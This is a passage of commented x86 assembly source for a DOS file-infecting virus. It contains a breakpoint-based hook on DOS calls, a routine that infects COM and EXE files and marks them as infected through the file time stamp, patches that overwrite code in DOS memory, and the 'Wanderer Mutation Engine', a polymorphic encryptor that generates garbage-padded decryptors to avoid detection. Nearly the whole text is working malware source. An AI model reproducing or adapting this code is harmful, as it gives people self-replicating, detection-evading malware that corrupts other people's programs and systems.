                   mov     eax,dr6         ; Test breakpoint number
                   test    al,3            ; Breakpoint 0 or 1?
                   jz      exit_pm1        ; No? then jmp
                   test    al,2            ; Breakpoint 1?
                   jz      dos_bp          ; Yes? then jmp
                   xor     eax,eax         ; Else breakpoint 0
                   mov     dr7,eax         ; Remove breakpoints
           pop     eax
           iretd

   dos_bp:
                   xor     eax,eax
                   mov     dr6,eax         ; Clear dr6 (never cleared by CPU)
           pop     eax
                   or      byte ptr [esp+0Ah],1    ; Set RF in stack
                   cmp     ax,0BABAh       ; Residency check?
                   jne     check_function  ; No? then jmp
                   mov     ax,0FACCh       ; DOS will try to exec function 0FACCh
                                           ;  but it doesn't exist, then DOS will
                                           ;  return 0FA00h
   _iretd:
           iretd

   check_function:
                   cmp     ax,3506h        ; Get int 6 vector?
                   je      check_patch     ; Yes? then jmp
                   cmp     ax,4B00h        ; Exec file?
                   je      check_prev_inf  ; Yes? then jmp
                   cmp     ah,3Dh          ; Open file?
                   jne     _iretd          ; No? then jmp
                   test    al,0Fh          ; For reading?
                   jne     _iretd          ; No? then jmp
   check_prev_inf:
                   cmp     cs:infecting,1          ; Exist a copy for infection?
                   je      kill_copy4infection     ; Yes? Kill it (finished work)
           pushad
                   call    set_ds
           mov     es,ax
                   mov     ecx,cs:page_1
           xor     ebp,ebp
                   mov     esi,90h         ; Segment 90h (phys. 90000h)
   l_map_page234:
                   mov     edx,cs:page_2[ebp*4]
                   call    map_page
                   db      66h,67h,89h,9Ch,0A9h    ; (TASM FIX)
                   dd      offset(old_pages)       ; mov [ecx+old_pages][ebp*4],ebx
                                                   ; Store old page
                   inc     esi                     ; Next 4KB
                   inc     bp                      ; Next page
                   cmp     bp,3                    ; Pages 2,3 and 4 in page table?
                   jne     l_map_page234           ; No? then jmp
                   mov     esi,cs:page_1
           mov     edi,90000h
                   mov     ds:[esi+infecting],1
                   mov     [esi+STACK_SIZE],esp    ; moc [esi+_esp],esp (TASM FIX)
           cld
                   mov     ecx,400h                ; 4KB
                   db      0F3h,66h,67h,0A5h       ; rep movsd (TASM FIX)
                                                   ; Copy code
           mov     ax,ss
           mov     ds,ax
           mov     esi,esp
                   mov     edi,cs:page_1
                   mov     ecx,STACK_SIZE/4
                   db      0F3h,66h,67h,0A5h       ; rep movsd (TASM FIX)
                                                   ; Copy stack
           popad
           mov     eax,9000h
                   push    eax                     ; GS
                   push    eax                     ; FS
                   push    dword ptr [esp+20h]     ; DS
                   push    dword ptr [esp+20h]     ; ES
                   push    eax                     ; SS
                   db      66h                     ; (TASM FIX) PUSH 0FFFEh (dword)
                   push    0FFEh                   ; ESP
                   dw      0                       ; (TASM FIX)
                   push    23000h                  ; EFLAGS (VM 8086, RPL 3)
                   push    eax                     ; CS
                   mov     eax,offset(infect_file)
                   push    eax                     ; EIP
                   iretd                   ; Jump to infect_file task, pm level 3

   check_patch:
           pushad
           mov     bx,cs
                   mov     ds,bx           ; DS = CS
           add     bx,8
           mov     es,bx
                   mov     esi,offset(memory_patch)
                   mov     bp,2            ; Number of patches
           cld
   search_code:
           mov     edi,90000h
           mov     eax,[si]
   search_patch:
           dec     edi
                   jz      skip_patch
                   cmp     es:[edi],eax            ; Maybe the code it's searching
                   jne     search_patch            ; No? then jmp
                   movzx   ebx,byte ptr [si+4]
                   mov     edx,[si+5]
                   cmp     es:[edi][ebx],edx       ; Code found?
                   jne     search_patch            ; No? then jmp
                   movsx   ebx,byte ptr [si+9]     ; Offset to the patch
           add     edi,ebx
                   movzx   ecx,byte ptr [si+0Ah]   ; Number of bytes to patch
                   add     si,start_patch1-memory_patch
                   db      0F3h,67h,0A4h           ; rep movsb (TASM FIX)
                                                   ; Patch it
                   jmp     next_patch


   skip_patch:
                   movzx   ax,[si+0Ah]             ; Point next patch
           add     si,ax
                   add     si,start_patch1-memory_patch
   next_patch:
                   dec     bp                      ; Another patch?
                   jnz     search_code             ; Yes? then jmp
                   jmp     exit_21h

   memory_patch:
   ; Patch #1
                   db      83h, 0c6h, 32h, 81h     ; Bytes to search (1)
                   db      0Ah                     ; Offset to bytes (2)
                   db      68h, 4Eh, 9Ch, 9Ah      ; Bytes to search (2)
                   db      0Dh                     ; Offset to the patch
                   db      end_patch1-start_patch1 ; Patch size
   start_patch1:
                   db      0EBh, 3                 ; Patch code
   end_patch1:

   ; Patch #2
                   db      8Dh, 56h, 0D6h, 3       ; Bytes to search (1)
                   db      5                       ; Offset to bytes 2
                   db      36h, 89h, 7, 8Bh        ; Bytes to search (2)
                   db      0FCh                    ; Offset to the patch
                   db      end_patch2-start_patch2 ; Patch size
   start_patch2:
                   db      0D1h, 0E6h, 83h, 0FEh, 0Ah, 75h, 2, 33h, 0C0h, 89h
                   db      42h, 0D6h, 0D1h, 0EEh, 4, 6, 93h        ; Patch code
   end_patch2:


   infect_file:
                   xor     ax,ax
           mov     di,dx
           mov     cx,41h
           push    ds
           pop     es
           cld
                   repne   scasb           ; Search end of path
                   jcxz    jmp_return_dpl0 ; Found? No? then jmp
                   jmp     check_extension ; Yes? then jmp

   jmp_return_dpl0:
                   jmp     return_dpl0

   check_extension:
                   mov     ax,[di-4]               ; Read file extension
           and     ax,0F0Fh
                   cmp     ax,('OC' and 0F0Fh)     ; (*.CO?) COM file?
                   je      executable_file         ; Yes? then jmp
                   cmp     ax,('XE' and 0F0Fh)     ; (*.EX?) EXE file?
                   je      executable_file         ; Yes? then jmp
                   jmp     return_dpl0

   executable_file:
           mov     si,di
           sub     si,6
           std
           mov     cx,7
           xor     bx,bx
   l_do_crc:                               ; Make CRC with filename
           lodsb
           and     al,1Fh
           add     bl,al
                   loop    l_do_crc
           cld
                   cmp     bl,3Fh          ; Skip filename (CRC) ?
                   jne     no_skip_file    ; No? then jmp
                   jmp     return_dpl0     ; Yes? then jmp

   no_skip_file:
           mov     ax,3D02h
           call    int_21h         ; Open file I/O
           xchg    ax,bx           ; BX := handle
           push    cs
           push    cs
           pop     ds
           pop     es
           call    initialize_random_seed
           mov     ax,5700h
                   call    int_21h         ; Get file date & time
                   mov     filedate,dx     ; Save
                   mov     filetime,cx
           and     cl,1Fh
                   cmp     cl,11h          ; Already infected?
                   je      close_file      ; Yes? then jmp
                   and     byte ptr filetime,0E0h  ; Mark infection
                   or      byte ptr filetime,11h
                   mov     dx,offset(buffer2)
           mov     ah,3Fh
                   mov     cx,BUFFER_SIZE
           call    int_21h         ; Read
                   cmp     ax,BUFFER_SIZE  ; Too small?
                   jne     close_file      ; Yes? then jmp
           call    go_end_file
                   mov     ds:filesize_l,ax ; Save original file size
                   mov     ds:filesize_h,dx
                   cmp     ax,0F000h       ; Too big?
                   ja      close_file      ; Yes? then jmp
                   cmp     ds:signature,'ZM' ; EXE file?
                   je      infect_exe      ; Yes? then jmp
                   mov     ds:host_type,0  ; It's a COM file
                   call    setup_engine    ; Encrypt virus code
           push    cx
           mov     ah,40h
                   mov     dx,offset(buffer2)
                   call    int_21h         ; Write original code (end of file)
           call    go_start_file
           pop     cx
           mov     ah,40h
                   mov     dx,BUFFER_SIZE
                   call    int_21h         ; Write encrypted virus code
   restore_fdate:
                   mov     cx,filetime
                   mov     dx,filedate
           mov     ax,5701h
                   call    int_21h         ; Restore file date and time
   close_file:
                   mov     ah,3Eh
           call    int_21h         ; Close file
   return_dpl0:
           mov     ax,4B00h
                   int     21h             ; Re-enter virus int 21h to kill this
                                           ;  copy done for replication

   infect_exe:
                   cmp     ds:pages,5      ; Too small?
                   jb      close_file      ; Yes? then jmp
                   db      83h, 3Eh        ; (TASM 2.5 FIX. UNNECESSARY IN 4.0)
                   dw      offset(max_mem)
                   db      0FFh            ; cmp ds:max_mem,0FFFFh
                                           ; Needs memory? TSR or exec files?
                   jne     close_file      ; Yes? then jmp
                   mov     ds:host_type,1  ; It's an EXE file
           xor     ax,ax
                   xchg    ax,ds:relo_items ; Numbers of relocation items
                                           ; Set it to 0
                   mov     ds:reloc_items,ax
                   cmp     ax,4096         ; Too much items?
                   ja      close_file      ; Yes? then jmp
                   mov     ax,ds:ofs_reloc ; Offset of 1st reloc. item
                   mov     ds:ofs_relocitems,ax
                   mov     eax,dword ptr ds:filesize_l
                   movzx   ecx,ds:header_size
                   shl     ecx,4           ; Calculate header size
                   sub     eax,ecx         ; Total size - header size
                   cmp     eax,1000h       ; Loadable module too small?
                   jb      close_file      ; Yes? then jmp
                   mov     si,offset(val_ip)
                   mov     di,offset(file_exeIP)
                   movsw                   ; Save Exe IP
                   movsw                   ; Save Exe CS
           xor     ax,ax
                   mov     di,offset(val_ip)
                   stosw                   ; Set to 0
                   stosw                   ; Set to 0(vir code starts after header)
           call    go_start_file
                   mov     cx,100h
                   mov     ah,40h
                   mov     dx,offset(buffer2)
                   call    int_21h         ; Save modified header
                   xor     cx,cx
                   mov     dx,ds:header_size
                   shl     dx,4            ; Calculate size header
           push    dx
                   mov     ax,4200h
                   call    int_21h         ; Lseek after header
                   mov     dx,offset(buffer2)
                   mov     ah,3Fh
                   mov     cx,BUFFER_SIZE
                   call    int_21h         ; Read original code
                   call    setup_engine    ; Encrypt virus code
           pop     dx
           push    cx
                   xor     cx,cx
                   mov     ax,4200h
                   call    int_21h         ; Lseek after header
                   mov     ah,40h
           pop     cx
           push    cx
                   mov     dx,BUFFER_SIZE
                   call    int_21h         ; Save encrypted virus code after header
           call    go_end_file
           pop     cx
                   mov     dx,offset(buffer2)
                   mov     ah,40h
                   call    int_21h         ; Save original code (end of file)
                   jmp     restore_fdate

   go_start_file:
           mov     ax,4200h
           xor     dx,dx
           xor     cx,cx
                   call    int_21h         ; Lseek start
           ret

   go_end_file:
           xor     dx,dx
           xor     cx,cx
           mov     ax,4202h
                   call    int_21h         ; Lseek end
           ret

   int_21h:
           pushf
                   db      9Ah             ; call far int 21h
   ofs_i21         dw      0
   seg_i21         dw      0
                   jnc     no_i21_error
           mov     ax,4B00h
                   int     21h             ; If error then re-enter virus int 21h
                                           ;  to remove the virus copy done for
                                           ;  infection
   no_i21_error:
           ret


   ; Prepare to call mutation engine
   setup_engine:
           push    bx
           mov     ax,0FFFFh
                   call    get_n_random    ; Get random mask [0..0FFFEh]
                   mov     ds:xor_mask,ax
                   call    encrypt_infection_routine       ; Encrypt
                   mov     si,100h         ; Always starts at DS:100h (EXE & COM)
                   mov     bp,si
                   mov     cx,VIRUS_SIZE
                   mov     di,offset(buffer1)
                   mov     ax,160h
           mov     bx,si
           pusha
                   push    ds:random1
                   push    ds:random2
                   call    mutation_engine         ; Encrypt to calculate the
                   mov     ds:size_in_file,cx      ;   increase size in file
                   pop     ds:random2
                   pop     ds:random1
           popa
                   call    mutation_engine         ; Encrypt virus code
                   call    encrypt_infection_routine       ; Decrypt inf. routine
           pop     bx
           ret

   encrypt_infection_routine:      ; Encrypt/decrypt the infection routine
           pusha
                   mov     si,offset(infect_file)
                   mov     cx,offset(return_dpl0)-offset(infect_file)
                   mov     ax,ds:xor_mask
   l_enc:
           xor     [si],ax
           inc     si
           inc     si
                   loop    l_enc
           popa
           ret


   filesize_l      dw      0
   filesize_h      dw      0
   size_in_file    dw      0
   xor_mask        dw      0
   file_exeIP      dw      0
   file_reloCS     dw      0
   reloc_items     dw      0
   ofs_relocitems  dw      0


   ; Wanderer Mutation Engine
   ; Parameters :
   ;  DS:SI -> code to encrypt
   ;  ES:DI -> buffer
   ;  CX    -> size
   ;  BP    -> delta offset (runtime offset)
   ;  AX    -> max size of decryptor
   ;  BX    -> min size of decryptor
   ; Return :
   ;  CX    -> size of decryptor + data encrypted

   mutation_engine:
                   mov     enc_buffer,di           ; Addr. buffer
                   mov     delta_ofs,bp            ; Addr. source code
                   mov     mask_dec_ofs,0
                   mov     end_encryptor,0C3h      ; RET
                   mov     code_size,cx            ; Number of bytes to encrypt
           push    cs
           pop     es
                   sub     ax,bx                   ; Decryptor size in [BX..AX]
                   call    get_n_random            ; [0..AX-BX]
                   add     ax,bx                   ; [BX..AX]
                   mov     decryptor_size,ax
                   add     di,ax                   ; Space for decryptor in buffer
                   rep     movsb                   ; Copy code to encrypt
           mov     ax,2
                   call    get_n_random            ; [0,1]
                   mov     ptr_select_reg,ax
           mov     ax,5
                   call    get_n_random            ; [0..4]
                   add     al,0Ah                  ; [0Ah..0Eh]
           xchg    ax,cx
                   mov     ax,decryptor_size
           div     cl
           sub     cl,4
                   mov     operations,cl           ; Number of encryption ops
           xor     ah,ah
                   mov     max_garbage,ax          ; Max garbage per operation
           mov     al,3
                   call    get_n_random            ; [0..2]
                   inc     al                      ; AL in [1..3]
                   or      ds:op_dec_counter,al    ; Opcode for decreasing counter
                   mov     ds:reg_counter,al
                   call    get_garbage_number
                   mov     di,enc_buffer
                   call    generate_garbage
                   mov     bx,offset(register_table)
                   add     bx,ptr_select_reg       ; Select registers in table
                   mov     al,[bx]                 ; Register 0 (SI) or 1 (DI)
                   mov     indexreg_op1,al         ; Index for operations
                   mov     dl,[bx+2]               ; Register 2 (SI) or 3 (DI)
                   mov     ds:indexreg_op2,dl      ; Index register
                   mov     bp,decryptor_size
                   add     bp,delta_ofs
                   call    get_garbage_number
                   call    generate_mov            ; Load a reg with delta-ofs
                   mov     dl,ds:reg_counter
                   mov     bp,code_size
                   call    get_garbage_number
                   shr     cx,1                    ; Decrypt words
                   call    generate_mov            ; Load a reg with # of loops
                   mov     ds:in_loop,1
                   mov     ofs_loop_begin,di       ; Start of loop code
                   call    get_garbage_number
           shr     cx,1
                   call    generate_garbage
                   mov     cl,operations           ; Number of operations
           xor     ch,ch
   l_gen_op:
           push    cx
                   call    generate_operation
                   call    get_garbage_number
                   call    generate_garbage
           pop     cx
                   loop    l_gen_op
                   mov     al,40h                  ; Gen. inc index reg (SI | DI)
                   or      al,ds:indexreg_op2
           stosb
                   call    get_garbage_number
                   call    generate_garbage
                   mov     cx,di                   ; End loop
                   sub     cx,ofs_loop_begin       ; Calculate loop size
           inc     cx
           inc     cx
           push    si
                   mov     si,offset(code_loop)    ; Generate end-loop code
           movsw
           movsw
           movsw
           pop     si
           add     cx,4
           neg     cx
                   mov     [di-2],cx               ; Jmp to begin of loop
                   jmp     fill_with_garbage

   code_loop:
   op_dec_counter  db      48h             ; dec reg_counter: DEC CX | DX | BX
                   jz      end_code_loop
                   db      0e9h,0,0        ; jmp to start of decryption loop
   end_code_loop:

   ;;;;   Unused code ! ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                   mov     al,0E2h         ; LOOP opcode
           stosb                   ; Store it
           xchg    al,cl
                   neg     al              ; loop jmp
           stosb
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   fill_with_garbage:
                   mov     cx,decryptor_size
                   add     cx,enc_buffer
                   sub     cx,di                   ; Fill buffer with garbage
                   mov     ds:in_loop,0            ; Loop finished
                   call    generate_garbage
           push    di
                   mov     cx,code_size
                   mov     bx,decryptor_size
                   add     bx,enc_buffer
                   mov     al,ds:indexreg_op2
                   or      ds:mov_pointerreg_bx,al
                   or      ds:inc_pointerreg,al
                   mov     ax,ds:encryptor_ptr
                   sti
                   db      89h                     ; mov index register,bx
   mov_pointerreg_bx db    0D8h
   l_encrypt_code:
           cli
                   call    ds:encryptor_ptr
                   sti
   inc_pointerreg  db      40h                     ; inc index register
                   loop    l_encrypt_code
           pop     cx
                   mov     dx,enc_buffer
                   sub     cx,dx
                   add     cx,code_size
                   mov     ds:encryptor_ptr,offset(end_encryptor) ; Reset buffers
                   mov     ds:ofs_endencryptor,offset(end_encryptor)
                   mov     al,0F8h
                   and     ds:mov_pointerreg_bx,al    ; Clear registers
                   and     ds:inc_pointerreg,al
                   and     ds:op_dec_counter,al
           ret

   register_table:
                   db      4       ; SI
                   db      5       ; DI
                   db      6       ; SI
                   db      7       ; DI

   generate_operation:
           mov     ax,7
                   call    get_n_random    ; [0..6]
                   shl     ax,2            ; AX in [0,4,8,...,24]
                   mov     si,offset(operation_table)
                   add     si,ax           ; Select operation
                   mov     bx,ds:encryptor_ptr
                   cmp     al,20           ; Needs an immediate address?
                   ja      get_immaddr     ; Yes? then jmp
                   mov     cx,[si]         ; Get decryptor opcode
                   or      ch,indexreg_op1 ; Insert op register
                   mov     [di],cx         ; Add to decryptor
                   mov     cx,[si+2]       ; Get encryptor opcode
                   or      ch,indexreg_op1 ; Insert op register
                   scasw                   ; SI+2, DI+2
                   cmp     al,12           ; Inst. needs a mask?
                   jb      get_inst_mask   ; Yes? then jmp
                   mov     [bx-2],cx       ; Add to encryptor
                   sub     ds:encryptor_ptr,2 ; Next encryptor entry
           ret

   get_inst_mask:
                   mov     al,0FFh
                   call    get_n_random    ; Get mask [0..0FEh]
                   mov     mask_dec_ofs,di ; Save current offsets
                   mov     mask_enc_ofs,bx
                   stosb                   ; Add mask to decryptor
                   mov     [bx-3],cx       ; Add instruction to encryptor
                   mov     [bx-1],al       ; Add mask to encryptor
                   sub     ds:encryptor_ptr,3
           ret

   get_immaddr:
                   cmp     mask_dec_ofs,0  ; Any mask instruction?
                   jz      no_mask_inst    ; No? then jmp
                   mov     bx,ds:ofs_endencryptor   ; Add inst at end of encryptor
           mov     ax,[si]
                   stosw                   ; Add instruction to decryptor
           mov     ax,[si+2]
                   mov     [bx],ax         ; Add instruction to encryptor
                   mov     ax,mask_dec_ofs ; Calculate mask address in decryptor
                   add     ax,delta_ofs
                   sub     ax,enc_buffer
                   stosw                   ; Add address to instruction
                   mov     ax,mask_enc_ofs ; Calculate mask address in encryptor
           dec     ax
                   mov     [bx+2],ax       ; Add to encryptor
           mov     al,0FFh
                   call    get_n_random    ; [0..0FEh]
                   stosb                   ; Value for adding to the mask
           mov     [bx+4],al
                   add     ds:ofs_endencryptor,5   ; New end of encryptor
                   mov     byte ptr [bx+5],0C3h    ; Add a RET at end
                   mov     mask_dec_ofs,0
   no_mask_inst:
           ret

   operation_table:
                   db      80h,30h         ; xor byte ptr [index],??
                   db      80h,30h         ; xor byte ptr [index],??

                   db      80h,0           ; add byte ptr [index],??
                   db      80h,28h         ; sub byte ptr [index],??

                   db      0C0h,0          ; rol byte ptr [index],??
                   db      0C0h,8          ; ror byte ptr [index],??

                   db      0D0h,0          ; rol byte ptr [index],1
                   db      0D0h,8          ; ror byte ptr [index],1

                   db      0F6h,18h        ; neg byte ptr [index]
                   db      0F6h,18h        ; neg byte ptr [index]

                   db      0FEh,0          ; inc byte ptr [index]
                   db      0FEh,8          ; dec byte ptr [index]

                   db      80h,6           ; add byte ptr [imm],??
                   db      80h,6           ; add byte ptr [imm],??


   generate_mov:
                   mov     ax,4
                   call    get_n_random    ; [0..3]
                   mov     si,offset(mov_table)
                   xchg    al,ah
                   aad     3               ; Select mov type
                   add     si,ax
                   lodsb
                   shl     ax,1            ; Check if needs to use routine 1 or 0
                   xchg    ax,bx
                   call    [bx+offset(mov_select)]
                   ret

   mov_select:
                   dw      offset(mov_r1)
                   dw      offset(mov_r2)

   mov_r1:                         ; Generates: mov reg(dl),value(bp)
                   movsw                   ; Store instruction opcodes
                   or      [di-1],dl       ; Set destination register
                   xchg    ax,bp
                   stosw                   ; Store delta offset
                   call    generate_garbage
                   ret

   mov_r2:                         ; Generates: (xor | sub) reg(dl),reg(dl)
                                   ;            (add | xor | or) reg(dl),value(bp)
                   push    si
                   push    dx
                   mov     ax,2
                   call    get_n_random    ; 0 or 1
                   shl     ax,1            ; Select instruction (clear register)
                   add     ax,offset(reg0_table)
                   xchg    ax,si
                   movsw                   ; Store instruction zero register
                   or      [di-1],dl       ; Destination register
                   shl     dl,3
                   or      [di-1],dl       ; Source reg. (same as destination)
                   shr     cx,1
                   push    cx
                   push    bp
                   call    generate_garbage
                   pop     bp
                   pop     cx
                   pop     dx
                   pop     si
                   movsw                   ; Store instruction
                   or      [di-1],dl       ; Destination register
                   xchg    ax,bp
                   stosw                   ; Store delta offset
                   call    generate_garbage
                   ret

   mov_table:
                   db      0               ; Use mov_r1
                   db      0C7h,0C0h       ; MOV reg,imm
                   db      1               ; Use mov_r2
                   db      81h,0C8h        ; OR reg,imm
                   db      1               ; Use mov_r2
                   db      81h,0C0h        ; ADD reg,imm
                   db      1               ; Use mov_r2
                   db      81h,0F0h        ; XOR reg,imm

   reg0_table:
                   db      29h,0C0h        ; SUB reg,reg
                   db      31h,0C0h        ; XOR reg,reg


   get_garbage_number:
                   mov     ax,max_garbage
                   call    get_n_random    ; [0..max_garbage-1]
           xchg    ax,cx
           ret

   generate_garbage:
                   and     cx,cx           ; Generate garbage?
                   jnz     do_garbage      ; Yes? then jmp
                   ret

   do_garbage:
                   mov     si,offset(garbage_table)
   l_select_entry:
           mov     ax,1Fh
                   call    get_n_random    ; [0..1Eh]
           mov     dl,al
                   inc     dl              ; DL in [1..1Fh]
   process_table_entry:
                   mov     al,[si]         ; Read entry
                   cmp     al,4Eh          ; End of table?
                   jne     check_entry     ; No? then jmp
                   mov     si,offset(garbage_table)
                   jmp     process_table_entry

   check_entry:
           mov     dh,al
                   and     al,0Fh          ; Get number of opcodes
                   cbw                     ; AH:=0 (b'cos AL<80h)
                   and     dl,dl           ; Generate this instruction block?
                   jz      generate_block  ; Yes? then jmp
           dec     dl
                   shr     dh,4            ; Calculate next table entry address :
                   add     al,dh           ;  #opcodes + #patches + 2
           add     si,ax
           inc     si
           inc     si
                   jmp     process_table_entry

   generate_block:
           push    cx
                   sub     cx,ax           ; Sub instruction size from garbage
                   test    ch,80h          ; Instruction too big?
           pop     cx
                   jne     l_select_entry  ; Yes? then jmp (don't generate)
                   mov     ds:garbagetogen,cx ; Remaining garbage
                   mov     bl,[si+1]       ; Read block flags
                   cmp     ds:jmp_ofs,bl   ; Allowed instruction? (don't allow
                                           ;  cond.jmp inside another cond.jmp)
                   ja      l_select_entry  ; No? then jmp
           mov     bh,bl
                   test    bl,40h          ; Can be in the decryptor loop?
                   jne     loop_ok         ; Yes? then jmp
                   cmp     ds:in_loop,1    ; Is in the loop?
                   je      l_select_entry  ; Yes? then jmp
   loop_ok:
           push    ax
           mov     ax,3Fh
                   and     bl,al           ; Get block probabilities
           call    get_n_random
                   cmp     bl,al           ; Generate block?
           pop     ax
                   jb      l_select_entry  ; No? then jmp
                   inc     si
           push    si
           push    cx
           xor     bx,bx
           mov     bl,dh
                   and     bl,0F0h         ; get # of patches
           shr     bl,4
           inc     bx
                   mov     cx,ax           ; # of opcodes
           push    si
           push    di
                   add     si,bx
                   rep     movsb           ; Generate block
           pop     di
           pop     si
                   mov     cx,bx           ; # of patches
                   dec     cx              ; Any patch?
                   jcxz    done_patches    ; No? then jmp
   l_do_patches:
           inc     si
                   mov     al,[si]         ; Read patch from table
           mov     dl,al
                   and     al,0Fh          ; Get byte to patch
                   cbw
           mov     bp,ax
           mov     al,dl
                   and     al,0F0h         ; Get function to use
           shr     al,3
           mov     bx,ax
                   add     bx,offset(function_table)
                   call    word ptr [bx]   ; Call function
                   loop    l_do_patches
   done_patches:
           pop     cx
           pop     si
           mov     al,dh
                   and     al,0Fh          ; Number of opcodes
           cbw
                   shr     dh,4            ; Number of patches
                   sub     cx,ax           ; Sub generated # from total garbage
                   add     di,ax           ; Inc buffer pointer
                   add     al,dh           ; opcodes+patches
                   add     si,ax           ; SI points to next table entry
                   inc     si              ;
                   mov     al,ds:jmp_ofs
                   and     al,al           ; Any jmp?
                   jz      all_garbage?    ; No? then jmp
                   test    al,80h          ; Generating a jump?
                   jnz     all_garbage?    ; Yes? then jmp
                                           ; else jmp is finished
                   add     cx,di           ; garbage to gen + current offset
                   mov     di,previous_ofs ; Save current offset
                   sub     cx,di           ; Sub jmp displacement from garbage
                   mov     ds:jmp_ofs,0
   all_garbage?:
                   and     cx,cx           ; All garbage generated?
                   jz      exit_garbage    ; Yes? then jmp
                   jmp     l_select_entry  ; No? then jmp

   exit_garbage:
                   mov     previous_ofs,di
           ret


   function_table:
   F_G_BYTE                = 0 * 16
                   dw      offset(generate_byte_word)
   F_I_OP_REG              = 1 * 16
                   dw      offset(insert_op_reg)
   F_I_REG                 = 2 * 16
                   dw      offset(insert_reg)
   F_I_MODRM               = 3 * 16
                   dw      offset(insert_modrm)
   F_I_RM                  = 4 * 16
                   dw      offset(insert_rm)
   F_ADD_0_5               = 5 * 16
                   dw      offset(add_0_5)
   F_I_REGRMMOD            = 6 * 16
                   dw      offset(insert_regrmmod)
   F_G_JXX                 = 7 * 16
                   dw      offset(generate_jxx)
   F_G_WORD                = 8 * 16
                   dw      offset(generate_byte_word)
   F_I_REG_PRESERVE_MODRM  = 9 * 16
                   dw      offset(insert_reg_preserve_modrm)
   F_I_RUNTIME_OFS         = 10 * 16
                   dw      offset(insert_runtime_ofs)
   F_I_LAST_REG_SRC        = 11 * 16
                   dw      offset(insert_last_reg_src)
   F_I_LAST_REG_DEST       = 12 * 16
                   dw      offset(insert_last_reg_dest)


   generate_byte_word:
                   mov     al,0FFh
                   call    get_n_random            ; [0..0FEh]
                   mov     es:[di+bp],al           ; Store byte
                   test    dl,80h                  ; Generating word?
                   jz      ret_gen_b_w             ; No? then jmp
                   mov     al,0FFh
                   call    get_n_random            ; [0..0FEh]
                   mov     es:[di+bp+1],al         ; Store another byte
   ret_gen_b_w:
                   ret

   insert_mod:
                   mov     al,0F0h
                   call    get_n_random    ; [0..0EFh]
                   and     al,80h          ; AL:=(80h or 0)
                   mov     ah,al
                   shr     al,1            ; AL:=(40h or 0)
                   or      al,ah           ; AL:=(0C0h or 0)
                   or      es:[di+bp],al   ; 0   -> register index
                                           ; 0C0 -> register to register
                   ret

   insert_reg:
                   mov     al,0F0h
                   call    get_n_random            ; [0..0EFh]
                   and     al,7                    ; Select register
                   cmp     al,ds:reg_sp            ; SP ?
                   je      insert_reg              ; Yes? then jmp
                   cmp     al,ds:indexreg_op2      ; Used as index ?
                   je      insert_reg              ; Yes? then jmp
                   push    ax
                   and     al,3
                   cmp     al,ds:reg_counter       ; Used as counter ?
                   pop     ax
                   je      insert_reg              ; Yes? then jmp
                   or      es:[di+bp],al           ; Insert register
                   mov     unused_reg,al           ; Save for later use
                   ret

   add_0_5:
                   mov     al,6
                   call    get_n_random            ; [0..5]
                   add     es:[di+bp],al
                   ret

   insert_rm:
                   mov     al,80h
                   call    get_n_random            ; [0..7Fh]
                   and     al,00000111b            ; AL in [0..7]
                   cmp     al,00000110b            ; immediate address?
                   je      insert_rm               ; Yes? Skip it
                   or      es:[di+bp],al
                   ret

   insert_modrm:
                   call    insert_mod
                   call    insert_rm
                   ret

   insert_regrmmod:
                   call    insert_reg
                   shl     byte ptr es:[di+bp],3   ; Register
                   call    insert_rm
                   call    insert_mod
                   ret

   insert_op_reg:
                   mov     al,0Fh                  ; [0..0Eh]
                   call    get_n_random
                   shl     al,3                    ; Operation
                   or      es:[di+bp],al           ; ADD, OR, ADC,...
                   call    insert_reg
                   ret

   generate_jxx:
                   mov     al,10h                  ; [0..0Fh]
                   call    get_n_random
                   or      es:[di+bp-1],al         ; JO,JNO,JB,JNB,JE,JNE,JBE,JA,
                                                   ; JS,JNS,JP,JNP,JL,JLE,JG
                   mov     ax,ds:garbagetogen      ; Don't jmp out of garbage code
                   dec     ax
                   dec     ax
                   call    get_n_random            ; [0..AX-1]
                   and     ax,3Fh                  ; jmp offset in [0..3Fh]
                   mov     es:[di+bp],al           ; Write offset
                   cbw
                   pusha
                   mov     cx,ax
                   or      al,80h                  ; Flag: generating cond. jmp
                   mov     ds:jmp_ofs,al
                   add     di,bp
                   inc     di
                   call    generate_garbage
                   and     ds:jmp_ofs,7Fh          ; Clear flag
                   popa
                   ret

   insert_reg_preserve_modrm:
                   mov     bl,es:[di+bp]           ; Read mod, r/m
                   mov     byte ptr es:[di+bp],0
                   call    insert_reg
                   shl     byte ptr es:[di+bp],3   ; Insert register
                   or      byte ptr es:[di+bp],bl  ; Previous mod, r/m
                   ret

   insert_last_reg_src:
                   mov     al,unused_reg
                   or      es:[di+bp],al           ; Insert register
                   ret

   insert_runtime_ofs:
                   mov     ax,di           ; Destination offset
                   sub     ax,enc_buffer   ; Offset in buffer
                   add     ax,delta_ofs    ; Offset in runtime
                   add     es:[di+bp],ax
                   ret

   insert_last_reg_dest:
                   mov     al,unused_reg
                   shl     al,3
                   or      es:[di+bp],al   ; Insert register
                   ret


   ; Garbage table format :
   ;   Each entry:
   ;
   ;       ABh
   ;       |^Number of bytes in this blocks
   ;       Number of fix functions
   ;
   ;       CDh : 11111111b
   ;             ||^^^^^^Generation probabilty of this block when selected
   ;             |Can be in a loop? (1=yes)
   ;             Can be generated? (1=always, 0=depend of previous generations)
   ;
   ;       EFh                     |
   ;       |^Byte to fix           | Number of fixes
   ;       Function to use         |
   ;       [...]                   |
   ;
   ;       GHh         (byte 0)    | List of opcodes in the block
   ;       [...]                   |
   ;

   garbage_table:
   ; TEST ??,imm8 :
                   db      23h             ; 2 fixes, 3 bytes
                   db      0FFh            ; Generate always, in loop, 100%
                   db      F_I_MODRM + 1   ; Function F_I_MODRM in byte 1
                   db      F_G_BYTE + 2    ; Function F_G_BYTE in byte 2
                   db      0F6h            ; byte 0
                   db      0               ; byte 1
                   db      0               ; byte 2

   ; 1 byte opcodes (CLC, STC, CLI, STI, CLD, STD) :
                   db      11h
                   db      0FFh
                   db      F_ADD_0_5 + 0
                   db      0F8h

   ; Jxx :
                   db      12h
                   db      7Fh     ; Don't gen a Jxx when another is being gen
                   db      F_G_JXX + 1
                   db      70h
                   db      0

   ; Arithmetic ops :
                   db      24h
                   db      0FFh
                   db      F_I_OP_REG + 1
                   DB      F_G_WORD + 2
                   db      81h
                   db      0C0h
                   db      0
                   db      0

   ; DEC reg :
                   db      11h
                   db      0FFh
                   db      F_I_REG + 0
                   db      48h

   ; NOP or XCHG AX,reg :
                   db      11h
